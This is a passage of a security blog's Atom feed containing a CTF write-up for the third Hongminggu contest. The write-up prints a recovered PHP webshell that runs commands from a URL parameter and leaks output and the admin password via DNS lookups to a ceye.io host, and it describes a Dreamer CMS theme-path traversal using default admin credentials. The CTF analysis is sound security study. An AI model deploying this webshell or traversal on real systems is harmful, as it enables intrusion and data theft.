    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5ae017b1f5d410795bfd9739750554905d01916611c48e80022de5e4979a6b6d">c37edc3dc388221caed397fda20028d37f56e9260e95a553f9e4a07c31a28dfbd6e28959ec8851bd44bca72f4c99fed2e3f2d59cf04f91230bf3fdfe87e3b692ed77a7893f19a317aa20db4289c8a89ebb1d608df2ea9fdd7a6449972732634f822b471416b98cf454c3ec2eda8a1dec</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="awd" scheme="https://www.lewiserii.top/categories/awd/"/>
    
    
    <category term="awd" scheme="https://www.lewiserii.top/tags/awd/"/>
    
    <category term="自动化工具" scheme="https://www.lewiserii.top/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>hw面试题</title>
    <link href="https://www.lewiserii.top/hw/hw%E9%9D%A2%E8%AF%95%E9%A2%98.html"/>
    <id>https://www.lewiserii.top/hw/hw%E9%9D%A2%E8%AF%95%E9%A2%98.html</id>
    <published>2023-05-15T05:00:00.000Z</published>
    <updated>2023-07-09T11:36:14.721Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="95e254ba17c385f02767765f283cee349ff70a575190d7167063629c395bf044"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="hw" scheme="https://www.lewiserii.top/categories/hw/"/>
    
    
    <category term="hw" scheme="https://www.lewiserii.top/tags/hw/"/>
    
    <category term="面试" scheme="https://www.lewiserii.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>第三届&quot;红明谷&quot;杯网络安全大赛wp</title>
    <link href="https://www.lewiserii.top/wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9D%E7%BA%A2%E6%98%8E%E8%B0%B7%E2%80%9C%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9D%E7%BA%A2%E6%98%8E%E8%B0%B7%E2%80%9C%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html</id>
    <published>2023-04-19T01:30:00.000Z</published>
    <updated>2023-04-20T10:31:31.655Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="阿尼亚"><a href="#阿尼亚" class="headerlink" title="阿尼亚"></a>阿尼亚</h2><p>文件尾有一串字符串<code>6333383363333963633338326333616263333865633261616332613363326261633262636333623263326235633261356332623563333834633262316333613063333832633361623061</code>，十六进制转字符串得到<code>c383c39cc382c3abc38ec2aac2a3c2bac2bcc3b2c2b5c2a5c2b5c384c2b1c3a0c382c3ab0a</code></p><p>C383明显是中文编码，转十六进制后爆破得到密码<code>简单的编码</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-1.png"></p><p>根据图片名字<code>netpixeljihad</code>，使用<code>PixelJihad</code>解密，密码是<code>简单的编码</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-2.png"></p><p>得到压缩包的密码<code>P@Ss_W0RD:)</code></p><p>解压得到<code>+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-</code></p><p><a href="https://www.dcode.fr/code-decabit">在线解密</a>一把梭</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-3.png"></p><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>流量分析，发现有个<code>shell.php</code>上传了一个<code>xxx1.php</code>，然后执行了<code>ls</code>和<code>cat secret.txt</code></p><p>格式化后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$servername</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$dbname</span>=<span class="hljs-string">&quot;zentao&quot;</span>;<br><span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=<span class="hljs-subst">$dbname</span>&quot;</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>,PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><span class="hljs-variable">$stmt</span>=<span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT password FROM zt_user WHERE account=\&#x27;admin\&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);<br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-variable">$output</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$param</span>);<br><span class="hljs-variable">$hex_output</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-variable">$hex_password</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$len_output</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_output</span>);<br><span class="hljs-variable">$len_password</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_password</span>);<br><span class="hljs-variable">$max_subdomain_length</span>=<span class="hljs-number">62</span>;<br><span class="hljs-variable">$subdomain_base</span>=<span class="hljs-string">&quot;yafgcy.ceye.io&quot;</span>;<br><span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len_output</span>;<span class="hljs-variable">$i</span>++) &#123;<br><span class="hljs-variable">$char_output</span>=<span class="hljs-variable">$hex_output</span>[<span class="hljs-variable">$i</span>];<br><span class="hljs-variable">$char_password</span>=<span class="hljs-variable">$hex_password</span>[<span class="hljs-variable">$i</span>%<span class="hljs-variable">$len_password</span>];<br><span class="hljs-variable">$char_xor</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_output</span>)^<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_password</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>.<span class="hljs-variable">$char_xor</span>)&gt;<span class="hljs-variable">$max_subdomain_length</span>) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br><span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$hex_xor</span>.=<span class="hljs-variable">$char_xor</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现是<code>dns</code>流量</p><p>提取出<code>secret.txt</code>，根据代码可知要与<code>admin</code>的密码进行异或</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">79227024716c7522787370254c777230667673222570247b76677322632671<br>d7b357226771575227a7372237677702573611f372570317b7672772076206<br>1479207024777b60247e6674231a626727666171372570317f766773207620<br>067879226731756c60206d75703670754e<br><br>password:8a3e684c923b763d252cf1e8734a7a29<br></code></pre></td></tr></table></figure><p>异或后发现是<code>DNA</code>编码，每62位会少内容，爆破就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python">mapping = &#123;<br><br><span class="hljs-string">&#x27;AAA&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>,<br><span class="hljs-string">&#x27;AAC&#x27;</span>:<span class="hljs-string">&#x27;b&#x27;</span>,<br><span class="hljs-string">&#x27;AAG&#x27;</span>:<span class="hljs-string">&#x27;c&#x27;</span>,<br><span class="hljs-string">&#x27;AAT&#x27;</span>:<span class="hljs-string">&#x27;d&#x27;</span>,<br><span class="hljs-string">&#x27;ACA&#x27;</span>:<span class="hljs-string">&#x27;e&#x27;</span>,<br><span class="hljs-string">&#x27;ACC&#x27;</span>:<span class="hljs-string">&#x27;f&#x27;</span>,<br><span class="hljs-string">&#x27;ACG&#x27;</span>:<span class="hljs-string">&#x27;g&#x27;</span>,<br><span class="hljs-string">&#x27;ACT&#x27;</span>:<span class="hljs-string">&#x27;h&#x27;</span>,<br><span class="hljs-string">&#x27;AGA&#x27;</span>:<span class="hljs-string">&#x27;i&#x27;</span>,<br><span class="hljs-string">&#x27;AGC&#x27;</span>:<span class="hljs-string">&#x27;j&#x27;</span>,<br><span class="hljs-string">&#x27;AGG&#x27;</span>:<span class="hljs-string">&#x27;k&#x27;</span>,<br><span class="hljs-string">&#x27;AGT&#x27;</span>:<span class="hljs-string">&#x27;l&#x27;</span>,<br><span class="hljs-string">&#x27;ATA&#x27;</span>:<span class="hljs-string">&#x27;m&#x27;</span>,<br><span class="hljs-string">&#x27;ATC&#x27;</span>:<span class="hljs-string">&#x27;n&#x27;</span>,<br><span class="hljs-string">&#x27;ATG&#x27;</span>:<span class="hljs-string">&#x27;o&#x27;</span>,<br><span class="hljs-string">&#x27;ATT&#x27;</span>:<span class="hljs-string">&#x27;p&#x27;</span>,<br><span class="hljs-string">&#x27;CAA&#x27;</span>:<span class="hljs-string">&#x27;q&#x27;</span>,<br><span class="hljs-string">&#x27;CAC&#x27;</span>:<span class="hljs-string">&#x27;r&#x27;</span>,<br><span class="hljs-string">&#x27;CAG&#x27;</span>:<span class="hljs-string">&#x27;s&#x27;</span>,<br><span class="hljs-string">&#x27;CAT&#x27;</span>:<span class="hljs-string">&#x27;t&#x27;</span>,<br><span class="hljs-string">&#x27;CCA&#x27;</span>:<span class="hljs-string">&#x27;u&#x27;</span>,<br><span class="hljs-string">&#x27;CCC&#x27;</span>:<span class="hljs-string">&#x27;v&#x27;</span>,<br><span class="hljs-string">&#x27;CCG&#x27;</span>:<span class="hljs-string">&#x27;w&#x27;</span>,<br><span class="hljs-string">&#x27;CCT&#x27;</span>:<span class="hljs-string">&#x27;x&#x27;</span>,<br><span class="hljs-string">&#x27;CGA&#x27;</span>:<span class="hljs-string">&#x27;y&#x27;</span>,<br><span class="hljs-string">&#x27;CGC&#x27;</span>:<span class="hljs-string">&#x27;z&#x27;</span>,<br><span class="hljs-string">&#x27;CGG&#x27;</span>:<span class="hljs-string">&#x27;A&#x27;</span>,<br><span class="hljs-string">&#x27;CGT&#x27;</span>:<span class="hljs-string">&#x27;B&#x27;</span>,<br><span class="hljs-string">&#x27;CTA&#x27;</span>:<span class="hljs-string">&#x27;C&#x27;</span>,<br><span class="hljs-string">&#x27;CTC&#x27;</span>:<span class="hljs-string">&#x27;D&#x27;</span>,<br><span class="hljs-string">&#x27;CTG&#x27;</span>:<span class="hljs-string">&#x27;E&#x27;</span>,<br><span class="hljs-string">&#x27;CTT&#x27;</span>:<span class="hljs-string">&#x27;F&#x27;</span>,<br><span class="hljs-string">&#x27;GAA&#x27;</span>:<span class="hljs-string">&#x27;G&#x27;</span>,<br><span class="hljs-string">&#x27;GAC&#x27;</span>:<span class="hljs-string">&#x27;H&#x27;</span>,<br><span class="hljs-string">&#x27;GAG&#x27;</span>:<span class="hljs-string">&#x27;I&#x27;</span>,<br><span class="hljs-string">&#x27;GAT&#x27;</span>:<span class="hljs-string">&#x27;J&#x27;</span>,<br><span class="hljs-string">&#x27;GCA&#x27;</span>:<span class="hljs-string">&#x27;K&#x27;</span>,<br><span class="hljs-string">&#x27;GCC&#x27;</span>:<span class="hljs-string">&#x27;L&#x27;</span>,<br><span class="hljs-string">&#x27;GCG&#x27;</span>:<span class="hljs-string">&#x27;M&#x27;</span>,<br><span class="hljs-string">&#x27;GCT&#x27;</span>:<span class="hljs-string">&#x27;N&#x27;</span>,<br><span class="hljs-string">&#x27;GGA&#x27;</span>:<span class="hljs-string">&#x27;O&#x27;</span>,<br><span class="hljs-string">&#x27;GGC&#x27;</span>:<span class="hljs-string">&#x27;P&#x27;</span>,<br><span class="hljs-string">&#x27;GGG&#x27;</span>:<span class="hljs-string">&#x27;Q&#x27;</span>,<br><span class="hljs-string">&#x27;GGT&#x27;</span>:<span class="hljs-string">&#x27;R&#x27;</span>,<br><span class="hljs-string">&#x27;GTA&#x27;</span>:<span class="hljs-string">&#x27;S&#x27;</span>,<br><span class="hljs-string">&#x27;GTC&#x27;</span>:<span class="hljs-string">&#x27;T&#x27;</span>,<br><span class="hljs-string">&#x27;GTG&#x27;</span>:<span class="hljs-string">&#x27;U&#x27;</span>,<br><span class="hljs-string">&#x27;GTT&#x27;</span>:<span class="hljs-string">&#x27;V&#x27;</span>,<br><span class="hljs-string">&#x27;TAA&#x27;</span>:<span class="hljs-string">&#x27;W&#x27;</span>,<br><span class="hljs-string">&#x27;TAC&#x27;</span>:<span class="hljs-string">&#x27;X&#x27;</span>,<br><span class="hljs-string">&#x27;TAG&#x27;</span>:<span class="hljs-string">&#x27;Y&#x27;</span>,<br><span class="hljs-string">&#x27;TAT&#x27;</span>:<span class="hljs-string">&#x27;Z&#x27;</span>,<br><span class="hljs-string">&#x27;TCA&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<br><span class="hljs-string">&#x27;TCC&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<br><span class="hljs-string">&#x27;TCG&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<br><span class="hljs-string">&#x27;TCT&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br><span class="hljs-string">&#x27;TGA&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<br><span class="hljs-string">&#x27;TGC&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<br><span class="hljs-string">&#x27;TGG&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<br><span class="hljs-string">&#x27;TGT&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>,<br><span class="hljs-string">&#x27;TTA&#x27;</span>:<span class="hljs-string">&#x27;9&#x27;</span>,<br><span class="hljs-string">&#x27;TTC&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&#x27;TTG&#x27;</span>:<span class="hljs-string">&#x27; &#x27;</span>,<br><span class="hljs-string">&#x27;TTT&#x27;</span>:<span class="hljs-string">&#x27;.&#x27;</span><br><br><br>&#125;<br><br><br>encode_string = <span class="hljs-string">&#x27;OME&#x27;</span><br><br>decode_string = <span class="hljs-string">&#x27;GGAGCGCTG&#x27;</span> <br><br>inverted_mapping = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(mapping.values(), mapping.keys()))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_dna</span>(<span class="hljs-params"> decode_string </span>):<br><br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>( <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(decode_string), <span class="hljs-number">3</span> ):<br>        piece =  decode_string[i:i+<span class="hljs-number">3</span>]<br>        <span class="hljs-comment"># pieces.append()</span><br>        pieces.append( mapping[piece] )<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_dna</span>(<span class="hljs-params">encode_string</span>):<br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encode_string:<br>        piece =  inverted_mapping[i]<br>        pieces.append(piece)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Decoded String is:- &#x27;</span>+ decode_dna(decode_string)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Encoded DNA String is:- &#x27;</span>+ encode_dna(encode_string)<br></code></pre></td></tr></table></figure><h2 id="X光的秘密"><a href="#X光的秘密" class="headerlink" title="X光的秘密"></a>X光的秘密</h2><p>给了个<code>task.dcm</code>文件，百度到能打开的软件<a href="https://www.microdicom.com/downloads.html">MicroDicom</a></p><p>使用软件导出，一共有二十张</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-2-1.png"></p><p>使用stegsolve发现最后三张图存在LSB</p><p>脚本提取出最低位数据，因为是灰度图，所以用其中一个通道就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;img-00001-00018.png&#x27;</span>)<br>w,h=img.size<br><br>rgb=[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>]<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        data=img.getpixel((i,j))<br>        rgb[<span class="hljs-number">0</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">0</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">1</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">1</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">2</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>]%<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r1: &#x27;</span>+rgb[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#print(&#x27;glow: &#x27;+rgb[1])</span><br><span class="hljs-comment">#print(&#x27;blow: &#x27;+rgb[2])</span><br><br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>content = <span class="hljs-built_in">str</span>(rgb[<span class="hljs-number">0</span>])<br>file.write(content)<br>file.close()<br></code></pre></td></tr></table></figure><p>img-00001-00018.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">100100010010110001101000000000<br></code></pre></td></tr></table></figure><p>img-00001-00019.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0110000110101001010000000000000<br></code></pre></td></tr></table></figure><p>img-00001-00020.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0001011001000010000010000000001<br></code></pre></td></tr></table></figure><p>将三张图片按顺序拼接发现刚好是<code>10001001</code>，<code>0x89</code>为<code>PNG</code>的头</p><p>使用脚本合并</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r.txt&quot;</span>)<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r2.txt&quot;</span>)<br>f3 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r3.txt&quot;</span>)<br>d1=f1.read()<br>d2=f2.read()<br>d3=f3.read()<br><br>new=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(d1):<br>    new+=v+d2[i]+d3[i]<br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>file.write(new)<br>file.close()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-2-2.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a>点击签到</h2><p>签到，点点点</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-1.png"></p><h2 id="Dreamer-amp-amp-Dreamer-revenge"><a href="#Dreamer-amp-amp-Dreamer-revenge" class="headerlink" title="Dreamer &amp;&amp; Dreamer_revenge"></a>Dreamer &amp;&amp; Dreamer_revenge</h2><p>参考<a href="https://forum.butian.net/share/2183#/">Dreamer CMS 代码审计</a></p><p>默认后台管理员账号密码为<code>wangjn/123456</code></p><p>在源码中复制一份<code>\src\main\resources\db\dreamer-cms\templates\default_v2</code>，修改<code>theme.json</code>文件中的<code>themePath</code>为<code>../../../../../../../../../../../</code>，然后打包成压缩包，在后台<code>风格管理</code>处上传</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-1.png"></p><p>启用后在<code>模板管理</code>处就可以看到跟目录下的文件了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-2.png"></p><p><code>Dreamer_revenge</code>的步骤与<code>Dreamer</code>一致，不过flag在<code>/proc/1/environ</code></p><p><img 